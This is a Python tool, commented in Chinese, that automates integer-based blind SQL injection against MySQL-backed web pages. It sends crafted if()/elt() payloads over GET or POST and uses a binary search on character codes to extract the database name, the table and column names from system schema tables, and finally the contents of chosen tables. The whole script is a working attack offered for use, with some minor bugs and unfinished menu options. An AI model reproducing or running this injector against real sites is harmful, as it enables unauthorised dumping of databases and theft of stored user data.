#整数型SQL盲注
import requests
class SQL_Injection:
    tables = []
    columns = []
    database = {}
    data = []
    header = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    sysTables = { 
        'information':{
            'table':[ 'table_name','information_schema.tables','table_schema' ],
            'column':[ 'cloumn_name','information_schema.columns','table_name' ]
        },
        'sys_xschema_flattened_keys':{
            'table':[ 'table_name','sys.x$schema_flattened_keys','table_schema' ],
            # 'column':('')
        },
        'mysql_innodb_table_stats':{
            'table':[ 'table_name','mysql.innodb_table_stats','database_name' ]
        }
     }
    #初始化参数
    def __init__(self,url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable):
        self.url = url
        self.requireMethod = requireMethod.lower()
        self.postParam = postParam
        self.rightTXT = rightTXT
        self.rightID = rightID
        self.errorID = errorID
        self.useFunc = useFunc
        self.sysTab = sysTable

    #获取数据库名
    def getDatabase(self):
        payload = self.useFunc+"(ascii(substr((database()),%d,1))>%d,"+self.rightID+","+errorID+")"
        print("result:"+self.getResult(payload))

    #获取表名
    def getTables(self):
        payload = self.useFunc+"(ascii(substr((select(group_concat("+self.sysTables[self.sysTab]['table'][0]+"))from("+self.sysTables[self.sysTab]['table'][1]+")where("+self.sysTables[self.sysTab]['table'][2]+"=database())),%d,1))>%d,"+self.rightID+","+self.errorID+")"
        self.tables = self.getResult(payload).split(',')
        print("result:"+str(self.tables))

    #获取各个表的列名
    def getColumns(self):
        for table in self.tables:
            payload = self.useFunc+"(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='"+table+"')),%d,1))>%d,"+self.rightID+","+self.errorID+")"
            self.columns = self.getResult(payload).split(',')
            self.database[table] = self.columns
            print("result:"+str(self.columns))
        print(self.database)
    
    #获取数据
    def getData(self,table,columns):
        payload = self.useFunc+"(ascii(substr((select(group_concat("+columns+"))from("+table+")),%d,1))>%d,"+self.rightID+","+self.errorID+")"
        self.data = self.getResult(payload).split(',')
        print("result:"+str(self.data))
    
    #公共函数，发送请求
    def getResult(self,payload):
        result = ''
        i = 1
        while True:
            low,high = 32,126
            mid = (low+high) // 2
            while low < high:
                if self.requireMethod == 'get':
                    resp = requests.get(self.url+payload % (i,mid)+'%23')
                elif self.requireMethod == 'post':
                    resp = requests.post(self.url,self.postParam+payload % (i,mid)+'%23',headers=self.header)
                if self.rightTXT in resp.text:
                    low = mid + 1
                else:
                    high = mid
                mid = (low + high) // 2
            if(chr(mid) == ' '):#如果是空格就证明找完了
                break
            i = i + 1
            result += chr(mid)
            print(result)
        return result


if __name__ == "__main__":
    try:
        while(True):
            url = input("input url(e.g,'get:www.example.com?id=,post:www.example.com'):")#url
            requireMethod = input("input require method(Get/Post):")#请求提交方式
            if(requireMethod.lower() == 'post'):
                postParam = input("input post param:")#格式是：id=
            else:
                postParam = ''
            rightTXT = input("input right string:")#正确结果的特征
            rightID = input("input right id(the number while be used when the result is right):")#正确是使用的数字
            errorID = input("input error id:")
            useFunc = input("select function(if/elt):")
            sysTable = input("select systable(information_schema/sys_xschema_flattened_keys/mysql_innodb_table_stats):")
            #选择注入的模式
            selection = input('''
                1.Auto injection
                2.Get database name
                3.Get tables name
                4.Get columns name
                5.Get data
            ''')
            if selection == '1': #自动注入
                work = SQL_Injection(url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable)
                work.getDatabase()
                work.getTables()
                work.getColumns()
                while True:
                    table = input("input table which you want to dump:")
                    print("columns:"+str(work.database[table]))
                    columns = input("input columns(split by ','):")
                    work.getData(table,columns)    
            elif selection == '2': #只获取数据库名
                work = SQL_Injection(url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable)
                work.getDatabase()
            elif selection == '3': #只获取表名
                work = SQL_Injection(url,requireMethod,postParam,rightTXT,rightID,errorID,useFunc,sysTable)
                work.getTables()
            elif selection == '4': #只获取列名
                pass
            elif selection == '5': #获取数据
                pass
            
    except KeyboardInterrupt:
        print("bye~")
